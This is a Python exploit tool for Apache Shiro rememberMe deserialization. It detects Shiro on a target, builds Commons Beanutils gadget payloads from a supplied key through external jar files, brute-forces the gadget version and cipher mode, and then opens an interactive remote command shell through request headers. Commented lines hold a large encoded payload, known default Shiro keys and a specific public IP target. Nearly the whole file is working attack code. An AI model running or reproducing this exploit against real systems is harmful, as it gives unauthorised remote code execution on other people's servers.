import requests
import base64
import re
import os
import argparse
import sys
import subprocess

def isShiro(url,HttpMethod = "get"):
    headers = {"Cookie":"rememberMe=1"}
    if HttpMethod.lower() == 'get' :
        response = requests.get(url,headers=headers)
        return ("rememberMe=deleteMe" in response.headers["Set-Cookie"])
    elif HttpMethod.lower() == 'post' :
        response = requests.get(url,headers=headers,data={"a":"1"})
        return ("rememberMe=deleteMe" in response.headers["Set-Cookie"])
    else:
        return False

def testEcho(payload,url,HttpMethod):
    headers = {"Cookie":"rememberMe="+payload,"techo":"cgxx"}
    
    if HttpMethod.lower() == 'get' :
        response = requests.get(url,headers=headers)
        return "techo" in response.headers and (response.headers["techo"]) == "cgxx"
    elif HttpMethod.lower() == 'post' :
        response = requests.get(url,headers=headers,data={"a":"1"})
        return "techo" in response.headers and (response.headers["techo"]) == "cgxx"
    else:
        return False
    
def cmdExec(payload,url,cmd,HttpMethod = "get"):
    headers = {"Cookie":"rememberMe="+payload,"c":base64.b64encode(cmd.encode())}
    if HttpMethod.lower() == 'get' :
        response = requests.get(url,headers=headers)
        ret = re.findall("\\$\\$\\$(.*?)\\$\\$\\$",response.text)
        if len(ret) == 0:
            return ""
        return base64.b64decode(ret[0]).decode('gbk')
    elif HttpMethod.lower() == 'post' :
        response = requests.get(url,headers=headers,data={"a":"1"})
        ret = re.findall("\\$\\$\\$(.*?)\\$\\$\\$",response.text)
        if len(ret) == 0:
            return ""
        return base64.b64decode(ret[0]).decode('gbk')
    else:
        return ""
    
def generatePayload(key,bc_version,isGCM,echoType="tomcatecho"):
    shiro_version = ""
    if isGCM == True:
        shiro_version = "142"
    else:
        shiro_version = "124"
    script_path = os.path.abspath(sys.argv[0])
    project_dir = os.path.dirname(script_path)

    # process = subprocess.Popen(project_dir+"\\payload\\jre8\\bin\\java.exe -jar "+project_dir+"\\payload\\bc"+bc_version+"_shiro"+shiro_version+".jar "+key, stderr=subprocess.PIPE)
    # print(project_dir+"\\payload\\jre8\\bin\\java.exe -jar "+project_dir+"\\payload\\bc"+bc_version+"_shiro"+shiro_version+".jar "+key)
    output = subprocess.check_output("java -jar "+project_dir+"\\payload\\bc"+bc_version+"_shiro"+shiro_version+".jar "+key,stderr=subprocess.DEVNULL, shell=True)
    # output, _ = process.communicate()
    # print (result)
    return (output.decode().replace("\r\n",""))


def brute_GCM_and_bc_version_and_echotype(key,url):
    bc_version=["183","194"]
    isGCM=[True,False]
    echotype = ["tomcatecho"]
    # project_dir = os.path.dirname(__file__)
    for bc in bc_version:
        for GCM in isGCM:
            for type in echotype:
                payload = generatePayload(key,bc,GCM,type)
                # print(payload)
                if testEcho(payload=payload,url=url,HttpMethod="get"):
                    return (bc,GCM,type)
    return ("",False,"")


if __name__ == '__main__':
    # payload = "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"
    # print(isShiro("http://123.60.145.122:8097/login","pOst"))
    # url = "http://127.0.0.1:8080/samples_web_war/"
    # print(testEcho(payload=payload,url=url,HttpMethod="get"))
    # print(cmdExec(payload=payload,url=url,cmd="ls",HttpMethod="get"))
    # payload = generatePayload(key="5aaC5qKm5oqA5pyvAAAAAA==",bc_version="183",isGCM=True)
    # print(testEcho(payload=payload,url=url,HttpMethod="get"))
    # print(brute_GCM_and_bc_version_and_echotype(key="kPH+bIxk5D2deZiIxcaaaA==",url=url))
    # print(cmdExec(payload=payload,url=url,cmd="whoami",HttpMethod="get"))
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True, help='target url')
    parser.add_argument('--key', required=True, help='shiro key')
    # parser.add_argument('--gcm',  help='is gcm? T or F')

    # Print usage
    # parser.print_help()
    args = parser.parse_args()
    url = args.url
    key = args.key
    # print(url)
    # print(key)
    bc_version,isGCM,type = brute_GCM_and_bc_version_and_echotype(url=url,key=key)
    # print(bc_version,isGCM,type)
    if bc_version == "183":
        print("[+] detect Commons Beanutils version:1.8.X ")
    elif bc_version == "194":
        print("[+] detect Commons Beanutils version:1.9.X ")
    else:
        print("[-] can't find payload")
        sys.exit(0)
    if isGCM == True:
        print("[+] target is using GCM mode")
    else:
        print("[+] target is using CBC mode")
    open_shell = input("[*] do you need to open shell? Y or N\n")
    if open_shell != "Y":
        sys.exit(0)
    print("[+] shell is open,input q() to quit")
    print(">",end="")
    cmd = input()
    payload = generatePayload(key=key,bc_version=bc_version,isGCM=isGCM)
    while cmd != "q()":
        print(cmdExec(payload=payload,url=url,cmd=cmd))
        print(">",end="")
        cmd = input()





